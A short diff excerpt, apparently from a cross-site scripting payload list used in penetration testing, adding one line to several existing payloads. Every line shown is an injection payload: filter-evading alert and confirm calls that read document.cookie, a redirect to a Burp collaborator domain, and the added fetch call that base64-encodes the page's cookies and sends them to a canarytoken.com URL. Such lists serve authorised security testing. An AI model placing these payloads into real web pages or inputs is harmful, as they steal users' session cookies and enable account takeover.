@@ -19,3 +19,4 @@ alert/**/(1)//
 ,window.location='http:'%2bdocument.domain%2b'.my-burp-domain',
 confirm(document?.cookie)
 confirm(this[`document`][`cookie`])
+fetch(`https://canarytoken.com/path/?p=`%252bbtoa(document?.cookie))
